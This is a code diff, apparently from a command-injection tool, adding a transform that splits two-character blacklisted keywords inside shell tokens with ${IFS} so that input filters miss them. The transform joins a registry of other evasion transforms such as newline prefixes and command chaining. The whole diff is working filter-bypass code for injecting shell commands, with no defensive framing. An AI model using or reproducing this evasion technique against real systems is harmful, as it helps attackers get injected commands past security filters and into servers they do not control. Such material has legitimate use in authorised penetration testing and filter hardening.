@@ -125,6 +125,32 @@ def _replace_standalone_substring(text: str, needle: str, replacement: str) -> s
     return "".join(out)
 
 
+def break_short_substrings(command: str, bl: Blacklist, **_) -> TransformResult:
+    """Split 2-char blocked substrings inside tokens (e.g. cp in TCP), not whole words."""
+    if bl.blocks_char("$"):
+        return TransformResult(command)
+    out = command
+    applied: list[str] = []
+    for tok in _command_parts(command):
+        for kw in sorted(bl.keywords):
+            if len(kw) != 2 or not bl.blocks_keyword(kw):
+                continue
+            for needle in {kw, kw.upper(), kw.lower()}:
+                if needle not in tok or tok.lower() == needle.lower():
+                    continue
+                mid = len(needle) // 2
+                replacement = needle[:mid] + "${IFS}" + needle[mid:]
+                new_tok = tok.replace(needle, replacement)
+                if new_tok == tok:
+                    continue
+                out = out.replace(tok, new_tok, 1)
+                applied.append(f"break_short:{needle}")
+                break
+    if not applied:
+        return TransformResult(command)
+    return TransformResult(out, applied=applied, hints=["${IFS} splits 2-char filter hits"])
+
+
 def break_blocked_substrings(command: str, bl: Blacklist, **_) -> TransformResult:
     """Split blocked keyword substrings (e.g. cp in TCP) so filters miss a contiguous match."""
     if bl.blocks_char("$"):
@@ -566,6 +592,7 @@ def chain_and_separator(command: str, bl: Blacklist, **_) -> TransformResult:
 
 
 TRANSFORMS = {
+    "break_short_substrings": break_short_substrings,
     "break_blocked_substrings": break_blocked_substrings,
     "newline_prefix": newline_prefix,
     "newline_cr_prefix": newline_cr_prefix,
